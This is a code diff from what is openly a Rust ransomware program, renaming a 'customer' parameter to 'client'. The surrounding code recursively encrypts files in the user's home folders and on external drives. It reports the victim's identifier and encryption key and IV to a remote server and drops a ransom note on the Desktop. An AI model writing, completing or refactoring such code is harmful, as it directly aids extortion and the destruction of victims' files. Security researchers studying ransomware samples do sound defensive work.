@@ -8,7 +8,7 @@ mod constants;
 mod crypto;
 mod filesystem;
 
-fn encrypt_local_filesystem(customer: &crypto::Customer) {
+fn encrypt_local_filesystem(client: &crypto::Client) {
     let folders = vec![
         "Music",
         "Videos",
@@ -26,21 +26,21 @@ fn encrypt_local_filesystem(customer: &crypto::Customer) {
                 &dirs::home_dir().unwrap().display(),
                 *folder
             )),
-            customer,
+            client,
         );
     });
 }
 
-fn walk_dir(path: &path::Path, customer: &crypto::Customer) {
+fn walk_dir(path: &path::Path, client: &crypto::Client) {
     if let Ok(contents) = fs::read_dir(path) {
         contents.par_bridge().into_par_iter().for_each(|entry| {
             let entry = entry.unwrap();
             match filesystem::check_dir_entry(&entry.path()) {
                 0 => {
-                    walk_dir(&entry.path(), customer);
+                    walk_dir(&entry.path(), client);
                 }
                 1 => {
-                    crypto::encrypt(&entry.path(), customer);
+                    crypto::encrypt(&entry.path(), client);
                 }
                 _ => (),
             }
@@ -59,8 +59,8 @@ pub fn report(message: &str) {
         .expect("Server connection failed");
 }
 
-fn create_ransom_note(customer: &crypto::Customer) {
-    let ransom_note = format!("You may need this: {}", customer.identification);
+fn create_ransom_note(client: &crypto::Client) {
+    let ransom_note = format!("You may need this: {}", client.identification);
     let desktop = dirs::home_dir().unwrap().join("Desktop");
     let onedrive_desktop = dirs::home_dir().unwrap().join("OneDrive").join("Desktop");
     if onedrive_desktop.exists() {
@@ -73,14 +73,14 @@ fn create_ransom_note(customer: &crypto::Customer) {
 }
 
 fn main() {
-    let customer = crypto::get_id();
+    let client = crypto::get_id();
     report(&format!(
         "**New client:** `{}`\n**Keypair:** `{}`, `{}`",
-        &customer.identification, &customer.keypair.key, &customer.keypair.iv
+        &client.identification, &client.keypair.key, &client.keypair.iv
     ));
-    encrypt_local_filesystem(&customer);
-    create_ransom_note(&customer);
+    encrypt_local_filesystem(&client);
+    create_ransom_note(&client);
     for entry in filesystem::get_external_drives() {
-        walk_dir(&entry, &customer);
+        walk_dir(&entry, &client);
     }
 }
